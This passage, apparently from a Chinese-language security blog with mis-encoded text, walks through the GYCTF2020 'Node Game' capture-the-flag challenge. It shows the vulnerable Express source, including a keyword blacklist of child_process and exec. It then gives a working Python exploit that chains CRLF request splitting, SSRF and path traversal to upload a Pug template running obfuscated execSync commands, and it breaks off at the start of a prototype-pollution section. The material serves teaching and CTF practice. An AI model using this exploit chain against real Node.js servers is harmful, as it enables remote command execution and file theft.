punctuation">.</span>_header<span class="token string">'GET //test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>é€šè¿‡crlfç»“åˆssrfåˆ©ç”¨</strong></p><p>é¢˜ç›®è¿æ¥ï¼š</p><p><a href="https://buuoj.cn/challenges#[GYCTF2020]Node%20Game">https://buuoj.cn/challenges#[GYCTF2020]Node%20Game</a></p><p>æºç ï¼š</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">var</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å¤„ç†æ–‡ä»¶è·¯å¾„ </span><span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">var</span> pug <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">pug</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// æ¨¡æ¿æ¸²æŸ“ </span><span class="token keyword">var</span> morgan <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'morgan'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// æ—¥å¿— </span><span class="token keyword">const</span> multer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'multer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ç”¨äºå¤„ç†multipart/form-dataç±»å‹çš„è¡¨å•æ•°æ®ï¼Œå®ç°ä¸Šä¼ åŠŸèƒ½</span><span class="token comment">// å°†ä¸Šä¼ çš„æ–‡ä»¶å­˜å‚¨åœ¨./dist[è‡ªåŠ¨åˆ›å»º]è¿”å›ä¸€ä¸ªåä¸ºfileçš„æ–‡ä»¶æ•°ç»„ </span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">multer</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">dest</span><span class="token operator">:</span> <span class="token string">'./dist'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ä½¿ç”¨ç®€åŒ–ç‰ˆæ—¥å¿— </span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">morgan</span><span class="token punctuation">(</span><span class="token string">'short'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// é™æ€æ–‡ä»¶è·¯ç”± </span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/uploads"</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'/uploads'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"/template"</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'/template'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// GETæ–¹æ³•è·å–actionå‚æ•°    </span>  <span class="token keyword">var</span> action <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>action <span class="token operator">?</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>action <span class="token operator">:</span> <span class="token string">"index"</span><span class="token punctuation">;</span>      <span class="token comment">// actionä¸­ä¸èƒ½åŒ…å«/ &amp; \    </span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>action<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">||</span> action<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Errrrr, You have been Blocked"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token comment">// å°†/template/[action].pugæ¸²æŸ“æˆhtmlè¾“å‡ºåˆ°æ ¹ç›®å½•    </span>  file <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/template/'</span> <span class="token operator">+</span> action <span class="token operator">+</span> <span class="token string">'.pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> html <span class="token operator">=</span> pug<span class="token punctuation">.</span><span class="token function">renderFile</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>      res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/file_upload'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> ip <span class="token operator">=</span> req<span class="token punctuation">.</span>connection<span class="token punctuation">.</span>remoteAddress<span class="token punctuation">;</span> <span class="token comment">// remoteAddressæ— æ³•ä¼ªé€ ï¼Œå› ä¸ºTCPæœ‰ä¸‰æ¬¡æ¡æ‰‹ï¼Œä¼ªé€ æºIPä¼šå¯¼è‡´æ— æ³•å®ŒæˆTCPè¿æ¥    </span>  <span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>      <span class="token comment">// è¯·æ±‚å¿…é¡»æ¥è‡ªlocalhost    </span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ip<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">"only admin's ip can use it"</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span>      <span class="token punctuation">&#125;</span>      fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>path<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">'upload failed'</span><span class="token punctuation">;</span>                  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                  <span class="token comment">// æ–‡ä»¶è·¯å¾„ä¸º/uploads/[mimetype]/filenameï¼Œmimetypeå¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Šå®ç°å°†æ–‡ä»¶å­˜å‚¨è‡³/templateå¹¶åˆ©ç”¨actionæ¸²æŸ“åˆ°ç•Œé¢            </span>      <span class="token keyword">var</span> file_path <span class="token operator">=</span> <span class="token string">'/uploads/'</span> <span class="token operator">+</span> req<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mimetype <span class="token operator">+</span> <span class="token string">"/"</span><span class="token punctuation">;</span>                  <span class="token keyword">var</span> file_name <span class="token operator">=</span> req<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>originalname                  <span class="token keyword">var</span> dir_file <span class="token operator">=</span> __dirname <span class="token operator">+</span> file_path <span class="token operator">+</span> file_name                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> file_path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                              fs<span class="token punctuation">.</span><span class="token function">mkdirSync</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> file_path<span class="token punctuation">)</span>                        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                              obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">"file type error"</span><span class="token punctuation">;</span>                              res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token keyword">return</span>                        <span class="token punctuation">&#125;</span>                  <span class="token punctuation">&#125;</span>                  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                        fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span>dir_file<span class="token punctuation">,</span> data<span class="token punctuation">)</span>                        obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'upload success'</span><span class="token punctuation">,</span> <span class="token literal-property property">filename</span><span class="token operator">:</span> file_path <span class="token operator">+</span> file_name<span class="token punctuation">&#125;</span>                  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        obj<span class="token punctuation">.</span>msg <span class="token operator">=</span> <span class="token string">'upload failed'</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>                  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token comment">// æŸ¥çœ‹é¢˜ç›®æºç  </span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/template/source.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/core'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> q <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q<span class="token punctuation">;</span>      <span class="token keyword">var</span> resp <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">'http://localhost:8081/source?'</span> <span class="token operator">+</span> q            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>               <span class="token comment">// å¯¹urlå­—ç¬¦è¿›è¡Œwaf        </span>    <span class="token keyword">var</span> trigger <span class="token operator">=</span> <span class="token function">blacklist</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>trigger <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"error occurs!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                              <span class="token comment">// nodeå¯¹/sourceå‘å‡ºè¯·æ±‚ï¼Œæ­¤å¤„å¯ä»¥åˆ©ç”¨å­—ç¬¦ç ´åè¿›è¡Œåˆ‡åˆ†æ”»å‡»è®¿é—®/file_uploadè·¯ç”±(â—ï¸æ­¤è¯·æ±‚å‘å‡ºè€…ä¸ºlocalhostä¸»æœº)ï¼Œå®ç°å¯¹remoteAddressçš„ç»•è¿‡                </span>        http<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">resp</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                              resp<span class="token punctuation">.</span><span class="token function">setEncoding</span><span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                              resp<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">.</span>code <span class="token operator">===</span> <span class="token string">"ECONNRESET"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Timeout occurs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">&#125;</span>                              <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token comment">// è¿”å›ç»“æœè¾“å‡ºåˆ°/core                    </span>          resp<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">chunk</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                                          resps <span class="token operator">=</span> chunk<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                          res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>resps<span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                          res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token punctuation">&#125;</span>                              <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                                    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"search param 'q' missing!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token comment">// å…³é”®å­—waf åˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥å®ç°ç»•è¿‡ </span><span class="token keyword">function</span> <span class="token function">blacklist</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> evilwords <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"global"</span><span class="token punctuation">,</span> <span class="token string">"process"</span><span class="token punctuation">,</span> <span class="token string">"mainModule"</span><span class="token punctuation">,</span> <span class="token string">"require"</span><span class="token punctuation">,</span> <span class="token string">"root"</span><span class="token punctuation">,</span> <span class="token string">"child_process"</span><span class="token punctuation">,</span> <span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"!"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">var</span> arrayLen <span class="token operator">=</span> evilwords<span class="token punctuation">.</span>length<span class="token punctuation">;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arrayLen<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> trigger <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>evilwords<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>trigger <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">return</span> <span class="token boolean">true</span>            <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span>  <span class="token keyword">var</span> server <span class="token operator">=</span> app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8081</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> host <span class="token operator">=</span> server<span class="token punctuation">.</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>address      <span class="token keyword">var</span> port <span class="token operator">=</span> server<span class="token punctuation">.</span><span class="token function">address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>port      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Example app listening at http://%s:%s"</span><span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestspayload <span class="token operator">=</span> <span class="token triple-quoted-string string">""" HTTP/1.1Host: 127.0.0.1Connection: keep-alivePOST /file_upload HTTP/1.1Host: 127.0.0.1Content-Length: &#123;&#125;Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZUlQgK81vgN7OB8A&#123;&#125;"""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'\r\n'</span><span class="token punctuation">)</span>body <span class="token operator">=</span> <span class="token triple-quoted-string string">"""------WebKitFormBoundaryZUlQgK81vgN7OB8AContent-Disposition: form-data; name="file"; filename="lethe.pug"Content-Type: ../template-var x = eval("glob"+"al.proce"+"ss.mainMo"+"dule.re"+"quire('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString()")-return x------WebKitFormBoundaryZUlQgK81vgN7OB8A--"""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'\r\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">,</span> body<span class="token punctuation">)</span> \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'\u012b'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\u0120'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\r\n'</span><span class="token punctuation">,</span> <span class="token string">'\u010d\u010a'</span><span class="token punctuation">)</span>    \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'\u0122'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">'\u0a27'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">,</span> <span class="token string">'\u015b'</span><span class="token punctuation">)</span>             \    <span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">'\u015d'</span><span class="token punctuation">)</span> \    <span class="token operator">+</span> <span class="token string">'GET'</span> <span class="token operator">+</span> <span class="token string">'\u0120'</span> <span class="token operator">+</span> <span class="token string">'/'</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://ec05f88c-b4d9-4408-bdc5-56e251328bb1.node4.buuoj.cn:81/core?q='</span> <span class="token operator">+</span> payload<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://ec05f88c-b4d9-4408-bdc5-56e251328bb1.node4.buuoj.cn:81/?action=lethe'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://xz.aliyun.com/t/2894#toc-2">https://xz.aliyun.com/t/2894#toc-2</a></p><h2 id="2-nodejsåŸå‹é“¾æ±¡æŸ“"><a href="#2-nodejsåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="2 nodejsåŸå‹é“¾æ±¡æŸ“"></a>2 nodejsåŸå‹é“¾æ±¡æŸ“</h2><h3 id="2-1-prototypeåŸå‹"><a href="#2-1-prototypeåŸå‹" class="headerlink" title="2.1 prototypeåŸå‹"></a>2.1 prototypeåŸå‹</h3><p><strong>ç®€ä»‹ï¼š</strong></p><p>å¯¹äºä½¿ç”¨è¿‡åŸºäºç±»çš„è¯­è¨€ (å¦‚ Java æˆ– C++) çš„å¼€å‘è€…ä»¬æ¥è¯´ï¼ŒJavaScript å®åœ¨æ˜¯æœ‰äº›ä»¤äººå›°æƒ‘ â€”â€” JavaScript æ˜¯åŠ¨æ€çš„ï¼Œæœ¬èº«ä¸æä¾›ä¸€ä¸ª <code>class</code> çš„å®ç°ã€‚å³ä¾¿æ˜¯åœ¨ ES2015/ES6 ä¸­å¼•å…¥äº† <code>class</code> å…³é”®å­—ï¼Œä½†é‚£ä¹Ÿåªæ˜¯è¯­æ³•ç³–ï¼ŒJavaScript ä»ç„¶æ˜¯åŸºäºåŸå‹çš„ã€‚</p><p>å½“è°ˆåˆ°ç»§æ‰¿æ—¶ï¼ŒJavaScript åªæœ‰ä¸€ç§ç»“æ„ï¼šå¯¹è±¡ã€‚æ¯ä¸ªå®ä¾‹å¯¹è±¡ï¼ˆobjectï¼‰éƒ½æœ‰ä¸€ä¸ªç§æœ‰å±æ€§ï¼ˆç§°ä¹‹ä¸º <strong>proto</strong> ï¼‰æŒ‡å‘å®ƒçš„æ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼ˆ<strong>prototype</strong>ï¼‰ã€‚è¯¥åŸå‹å¯¹è±¡ä¹Ÿæœ‰ä¸€ä¸ªè‡ªå·±çš„åŸå‹å¯¹è±¡ï¼ˆ__proto__ï¼‰ï¼Œå±‚å±‚å‘ä¸Šç›´åˆ°ä¸€ä¸ªå¯¹è±¡çš„åŸå‹å¯¹è±¡ä¸º <code>null</code>ã€‚æ ¹æ®å®šä¹‰ï¼Œ<code>null</code> æ²¡æœ‰åŸå‹ï¼Œå¹¶ä½œä¸ºè¿™ä¸ª<strong>åŸå‹é“¾</strong>ä¸­çš„æœ€åä¸€ä¸ªç¯èŠ‚ã€‚</p><p>å‡ ä¹æ‰€æœ‰ JavaScript ä¸­çš„å¯¹è±¡éƒ½æ˜¯ä½äºåŸå‹é“¾é¡¶ç«¯çš„ <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object"><code>Object</code></a> çš„å®ä¾‹ã€‚</p><p>å°½ç®¡è¿™ç§åŸå‹ç»§æ‰¿é€šå¸¸è¢«è®¤ä¸ºæ˜¯ JavaScript 